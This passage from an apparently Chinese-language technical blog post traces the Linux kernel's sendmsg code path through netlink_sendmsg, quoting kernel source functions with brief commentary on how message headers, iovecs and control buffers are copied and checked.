class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __copy_msghdr_from_user(struct msghdr *kmsg,</span><br><span class="line">    struct user_msghdr __user *umsg,</span><br><span class="line">    struct sockaddr __user **save_addr,</span><br><span class="line">    struct iovec __user **uiov, <span class="keyword">size_t</span> *nsegs)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line"><span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;msg, umsg, <span class="keyword">sizeof</span>(*umsg)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">kmsg-&gt;msg_control_is_user = <span class="literal">true</span>;</span><br><span class="line">kmsg-&gt;msg_control_user = msg.msg_control;</span><br><span class="line">kmsg-&gt;msg_controllen = msg.msg_controllen;</span><br><span class="line">kmsg-&gt;msg_flags = msg.msg_flags;</span><br><span class="line"></span><br><span class="line">kmsg-&gt;msg_namelen = msg.msg_namelen;</span><br><span class="line"><span class="keyword">if</span> (!msg.msg_name)</span><br><span class="line">kmsg-&gt;msg_namelen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmsg-&gt;msg_namelen &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmsg-&gt;msg_namelen &gt; <span class="keyword">sizeof</span>(struct sockaddr_storage))</span><br><span class="line">kmsg-&gt;msg_namelen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (save_addr)</span><br><span class="line">*save_addr = msg.msg_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msg.msg_name &amp;&amp; kmsg-&gt;msg_namelen) &#123;</span><br><span class="line"><span class="keyword">if</span> (!save_addr) &#123;</span><br><span class="line">err = move_addr_to_kernel(msg.msg_name,</span><br><span class="line">  kmsg-&gt;msg_namelen,</span><br><span class="line">  kmsg-&gt;msg_name);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kmsg-&gt;msg_name = <span class="literal">NULL</span>;</span><br><span class="line">kmsg-&gt;msg_namelen = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msg.msg_iovlen &gt; UIO_MAXIOV)</span><br><span class="line"><span class="keyword">return</span> -EMSGSIZE;</span><br><span class="line"></span><br><span class="line">kmsg-&gt;msg_iocb = <span class="literal">NULL</span>;</span><br><span class="line">*uiov = msg.msg_iov;</span><br><span class="line">*nsegs = msg.msg_iovlen;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__copy_msghdr_from_user</code>函数内部前面部分就是对kmsg的成员做赋值，随后进入到<code>move_addr_to_kernel</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move_addr_to_kernel</span><span class="params">(<span class="keyword">void</span> __user *uaddr, <span class="keyword">int</span> ulen, struct sockaddr_storage *kaddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ulen &lt; <span class="number">0</span> || ulen &gt; <span class="keyword">sizeof</span>(struct sockaddr_storage))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ulen == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(kaddr, uaddr, ulen))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">return</span> audit_sockaddr(ulen, kaddr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也就是将内容复制到内核地址中，这里的内核可以追溯到开头的<code>___sys_sendmsg</code>函数中<code>struct sockaddr_storage address;</code>也就是这个位置，而这个结构体在前面也是介绍过。</p><p>在<code>__copy_msghdr_from_user</code>函数最后则是将iov地址和个数写到<code>kmsg</code>中，接着返回函数调用<code>import_iovec</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct iovec *<span class="title">iovec_from_user</span><span class="params">(<span class="keyword">const</span> struct iovec __user *uvec,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_segs, <span class="keyword">unsigned</span> <span class="keyword">long</span> fast_segs,</span></span></span><br><span class="line"><span class="params"><span class="function">struct iovec *fast_iov, <span class="keyword">bool</span> compat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span> =</span> fast_iov;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SuS says &quot;The readv() function *may* fail if the iovcnt argument was</span></span><br><span class="line"><span class="comment"> * less than or equal to 0, or greater than &#123;IOV_MAX&#125;.  Linux has</span></span><br><span class="line"><span class="comment"> * traditionally returned zero for zero segments, so...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_segs == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> iov;</span><br><span class="line"><span class="keyword">if</span> (nr_segs &gt; UIO_MAXIOV)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"><span class="keyword">if</span> (nr_segs &gt; fast_segs) &#123;</span><br><span class="line">iov = kmalloc_array(nr_segs, <span class="keyword">sizeof</span>(struct iovec), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!iov)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (compat)</span><br><span class="line">ret = copy_compat_iovec_from_user(iov, uvec, nr_segs);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = copy_iovec_from_user(iov, uvec, nr_segs);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line"><span class="keyword">if</span> (iov != fast_iov)</span><br><span class="line">kfree(iov);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> iov;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> __import_iovec(<span class="keyword">int</span> type, <span class="keyword">const</span> struct iovec __user *uvec,</span><br><span class="line"> <span class="keyword">unsigned</span> nr_segs, <span class="keyword">unsigned</span> fast_segs, struct iovec **iovp,</span><br><span class="line"> struct iov_iter *i, <span class="keyword">bool</span> compat)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> total_len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> seg;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span>;</span></span><br><span class="line"></span><br><span class="line">iov = iovec_from_user(uvec, nr_segs, fast_segs, *iovp, compat);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(iov)) &#123;</span><br><span class="line">*iovp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(iov);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * According to the Single Unix Specification we should return EINVAL if</span></span><br><span class="line"><span class="comment"> * an element length is &lt; 0 when cast to ssize_t or if the total length</span></span><br><span class="line"><span class="comment"> * would overflow the ssize_t return value of the system call.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Linux caps all read/write calls to MAX_RW_COUNT, and avoids the</span></span><br><span class="line"><span class="comment"> * overflow case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (seg = <span class="number">0</span>; seg &lt; nr_segs; seg++) &#123;</span><br><span class="line"><span class="keyword">ssize_t</span> len = (<span class="keyword">ssize_t</span>)iov[seg].iov_len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!access_ok(iov[seg].iov_base, len)) &#123;</span><br><span class="line"><span class="keyword">if</span> (iov != *iovp)</span><br><span class="line">kfree(iov);</span><br><span class="line">*iovp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &gt; MAX_RW_COUNT - total_len) &#123;</span><br><span class="line">len = MAX_RW_COUNT - total_len;</span><br><span class="line">iov[seg].iov_len = len;</span><br><span class="line">&#125;</span><br><span class="line">total_len += len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iov_iter_init(i, type, iov, nr_segs, total_len);</span><br><span class="line"><span class="keyword">if</span> (iov == *iovp)</span><br><span class="line">*iovp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*iovp = iov;</span><br><span class="line"><span class="keyword">return</span> total_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">import_iovec</span><span class="params">(<span class="keyword">int</span> type, <span class="keyword">const</span> struct iovec __user *uvec,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">unsigned</span> nr_segs, <span class="keyword">unsigned</span> fast_segs,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iovec **iovp, struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> __import_iovec(type, uvec, nr_segs, fast_segs, iovp, i,</span><br><span class="line">      in_compat_syscall());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面则是对iov的初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ____sys_sendmsg(struct socket *sock, struct msghdr *msg_sys,</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, struct used_address *used_address,</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ctl[<span class="keyword">sizeof</span>(struct cmsghdr) + <span class="number">20</span>]</span><br><span class="line">__aligned(<span class="keyword">sizeof</span>(<span class="keyword">__kernel_size_t</span>));</span><br><span class="line"><span class="comment">/* 20 is size of ipv6_pktinfo */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *ctl_buf = ctl;</span><br><span class="line"><span class="keyword">int</span> ctl_len;</span><br><span class="line"><span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">err = -ENOBUFS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msg_sys-&gt;msg_controllen &gt; INT_MAX)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);</span><br><span class="line">ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line"><span class="keyword">if</span> ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123;</span><br><span class="line">err =</span><br><span class="line">    cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl,</span><br><span class="line">     <span class="keyword">sizeof</span>(ctl));</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">ctl_buf = msg_sys-&gt;msg_control;</span><br><span class="line">ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl_len) &#123;</span><br><span class="line">BUILD_BUG_ON(<span class="keyword">sizeof</span>(struct cmsghdr) !=</span><br><span class="line">     CMSG_ALIGN(<span class="keyword">sizeof</span>(struct cmsghdr)));</span><br><span class="line"><span class="keyword">if</span> (ctl_len &gt; <span class="keyword">sizeof</span>(ctl)) &#123;</span><br><span class="line">ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (ctl_buf == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(ctl_buf, msg_sys-&gt;msg_control_user, ctl_len))</span><br><span class="line"><span class="keyword">goto</span> out_freectl;</span><br><span class="line">msg_sys-&gt;msg_control = ctl_buf;</span><br><span class="line">msg_sys-&gt;msg_control_is_user = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">msg_sys-&gt;msg_flags = flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sock-&gt;file-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">msg_sys-&gt;msg_flags |= MSG_DONTWAIT;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If this is sendmmsg() and current destination address is same as</span></span><br><span class="line"><span class="comment"> * previously succeeded address, omit asking LSM&#x27;s decision.</span></span><br><span class="line"><span class="comment"> * used_address-&gt;name_len is initialized to UINT_MAX so that the first</span></span><br><span class="line"><span class="comment"> * destination address never matches.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (used_address &amp;&amp; msg_sys-&gt;msg_name &amp;&amp;</span><br><span class="line">    used_address-&gt;name_len == msg_sys-&gt;msg_namelen &amp;&amp;</span><br><span class="line">    !<span class="built_in">memcmp</span>(&amp;used_address-&gt;name, msg_sys-&gt;msg_name,</span><br><span class="line">    used_address-&gt;name_len)) &#123;</span><br><span class="line">err = sock_sendmsg_nosec(sock, msg_sys);</span><br><span class="line"><span class="keyword">goto</span> out_freectl;</span><br><span class="line">&#125;</span><br><span class="line">err = sock_sendmsg(sock, msg_sys);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If this is sendmmsg() and sending to current destination address was</span></span><br><span class="line"><span class="comment"> * successful, remember it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (used_address &amp;&amp; err &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">used_address-&gt;name_len = msg_sys-&gt;msg_namelen;</span><br><span class="line"><span class="keyword">if</span> (msg_sys-&gt;msg_name)</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;used_address-&gt;name, msg_sys-&gt;msg_name,</span><br><span class="line">       used_address-&gt;name_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_freectl:</span><br><span class="line"><span class="keyword">if</span> (ctl_buf != ctl)</span><br><span class="line">sock_kfree_s(sock-&gt;sk, ctl_buf, ctl_len);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到<code>___sys_sendmsg</code>函数，在执行完<code>sendmsg_copy_msghdr</code>之后紧接着会调用<code>____sys_sendmsg</code>函数。</p><p>在函数前半段会对flags和<code>msghdr</code>结构体做完检测之后会根据传入的<code>used_address</code>指针判断当前发送消息的目的地址和它记录的地址是否一致，如果一致则调用<code>sock_sendmsg_nosec</code>函数，如果不一致则调用<code>sock_sendmsg</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err = security_socket_sendmsg(sock, msg,</span><br><span class="line">  msg_data_left(msg));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err ?: sock_sendmsg_nosec(sock, msg);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_sendmsg);</span><br></pre></td></tr></table></figure><p>这里看<code>sock_sendmsg</code>的定义可以看到最终也会调用<code>sock_sendmsg_nosec</code>函数，区别就是其做了安全检测。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INDIRECT_CALL_INET(f, f2, f1, ...) f(__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sock_sendmsg_nosec</span><span class="params">(struct socket *sock, struct msghdr *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = INDIRECT_CALL_INET(sock-&gt;ops-&gt;sendmsg, inet6_sendmsg,</span><br><span class="line">     inet_sendmsg, sock, msg,</span><br><span class="line">     msg_data_left(msg));</span><br><span class="line">BUG_ON(ret == -EIOCBQUEUED);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据前面所提到的<code>Netlink</code>初始化中，可以得知这里的sendmsg为<code>netlink_sendmsg</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">netlink_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> =</span> nlk_sk(sk);</span><br><span class="line">DECLARE_SOCKADDR(struct sockaddr_nl *, addr, msg-&gt;msg_name);</span><br><span class="line">u32 dst_portid;</span><br><span class="line">u32 dst_group;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">u32 netlink_skb_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msg-&gt;msg_flags &amp; MSG_OOB)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">err = scm_send(sock, msg, &amp;scm, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msg-&gt;msg_namelen) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (msg-&gt;msg_namelen &lt; <span class="keyword">sizeof</span>(struct sockaddr_nl))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (addr-&gt;nl_family != AF_NETLINK)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">dst_portid = addr-&gt;nl_pid;</span><br><span class="line">dst_group = ffs(addr-&gt;nl_groups);</span><br><span class="line">err =  -EPERM;</span><br><span class="line"><span class="keyword">if</span> ((dst_group || dst_portid) &amp;&amp;</span><br><span class="line">    !netlink_allowed(sock, NL_CFG_F_NONROOT_SEND))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">netlink_skb_flags |= NETLINK_SKB_DST;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_portid = nlk-&gt;dst_portid;</span><br><span class="line">dst_group = nlk-&gt;dst_group;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nlk-&gt;bound) &#123;</span><br><span class="line">err = netlink_autobind(sock);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Ensure nlk is hashed and visible. */</span></span><br><span class="line">smp_rmb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -EMSGSIZE;</span><br><span class="line"><span class="keyword">if</span> (len &gt; sk-&gt;sk_sndbuf - <span class="number">32</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">err = -ENOBUFS;</span><br><span class="line">skb = netlink_alloc_large_skb(len, dst_group);</span><br><span class="line"><span class="keyword">if</span> (skb == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">NETLINK_CB(skb).portid= nlk-&gt;portid;</span><br><span class="line">NETLINK_CB(skb).dst_group = dst_group;</span><br><span class="line">NETLINK_CB(skb).creds= scm.creds;</span><br><span class="line">NETLINK_CB(skb).flags= netlink_skb_flags;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (memcpy_from_msg(skb_put(skb, len), msg, len)) &#123;</span><br><span class="line">kfree_skb(skb);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = security_netlink_send(sk, skb);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">kfree_skb(skb);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dst_group) &#123;</span><br><span class="line">refcount_inc(&amp;skb-&gt;users);</span><br><span class="line">netlink_broadcast(sk, skb, dst_portid, dst_group, GFP_KERNEL);</span><br><span class="line">&#125;</span><br><span class="line">err = netlink_unicast(sk, skb, dst_portid, msg-&gt;msg_flags &amp; MSG_DONTWAIT);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">scm_destroy(&amp;scm);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数首先初始化一个<code>sockaddr_nl</code>，前面的主要逻辑就是判断是否可以进行组播以及在做一些验证。</p><p>后面会判断发送的数据长度是否过长，并且通过<code>netlink_alloc_large_skb</code>申请一个skb结构。在创建完成skb结构之后回对其进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_CB(skb)(*(struct 